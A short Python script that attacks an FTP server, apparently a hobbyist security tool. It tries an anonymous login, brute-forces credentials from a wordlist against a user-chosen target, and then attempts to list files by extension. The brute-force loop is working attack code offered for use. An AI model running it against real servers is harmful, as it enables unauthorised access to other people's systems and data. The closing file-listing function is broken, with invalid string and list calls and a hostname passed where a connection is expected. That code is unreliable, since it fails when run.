import ftplib
import time
from os import truncate

# Method tries to log into a targeted ftpserver using anonymous credentials
def anonymousLogin(targetHostname):
    try:
        # Makes a connection to the ftp server
        ftp = ftplib.FTP(targetHostname)
        # tries to login with default anonymous login credentails
        ftp.login('anonymous', 'anonymous')
        # Displays either success or failure message
        print("\n[*] "+str(targetHostname) +" FTP Anonymous login successful")
        ftp.quit()
        return True
    except Exception :
        print("\n[ - ] "+str(targetHostname)+" FTP anonymous login failed")
        return False

# Method tries to brutefoce login using user supplied list of credentials
def forceLogin(targetHostname, credentialsFile):
    # Reads in credentials from the user specified file
    creds = open(credentialsFile, 'r')
    for line in creds.readlines():
        time.sleep(1)
        # strips the input from the file into username and password, credentails should be stored in <username>:<password> format
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: "+username + " : "+password)
        
        try:
            # attempts to make a ftp connection using supplied credentials
            ftp = ftplib.FTP(targetHostname)
            ftp.login(username, password)
            # displays to user credentails that were able to make a successful connection
            print("\n[*] "+str(targetHostname)+" FTP login successful...  "+username+":"+password)
            ftp.quit()
            return(username, password)
        except Exception:
            pass
    print("\n[ - ] Unable to bruteforce any FTP login credentials from given list")
    return(None, None)

# Method prints out all of the contents of the ftp or searches for spefic files extentions and prints only those 
def displayContents(ftpconnection, extentions):
    try:
        directoryList = ftpconnection.nlst()
    except:
        directoryList = []
        print("[ - ] Unable to list contents of main directory...")
        print("[ - ] Moving to next Target.")
        return
    
    if(extentions.equals("")):
        for fileName in directoryList.lower():
            print(fileName)
    else:
        for ext in extentions:
            for fileName in directoryList.lower():
                if(ext in fileName):
                    print("File found matching extention requirement: "+fileName + "matching: "+ext+"\n")

import argparse
parser = argparse.ArgumentParser(description="Check FTP connections for anonymous login and brute force login")
parser.add_argument("-t","--TargetHost", metavar="targetHost", type=str,required=True, help="TargetHost address")
parser.add_argument("-w", "--wordlist", metavar="credentialWordlist", type=str, required=True, help="Credential Wordlist")
parser.add_argument("-x", "--extentions", metavar="extentions", type=str, required=False, help="desired extentions")

args = parser.parse_args()

target = args.TargetHost
file = args.wordlist

if(args.extentions == ""):
    extentions = ""
else:
    extentions = args.extentions

print("[+] Trying anonymous login... \n")
anonymousLogin(target)
print("[+] Starting to brute force... \n")
forceLogin(target, file)
displayContents(target, extentions)
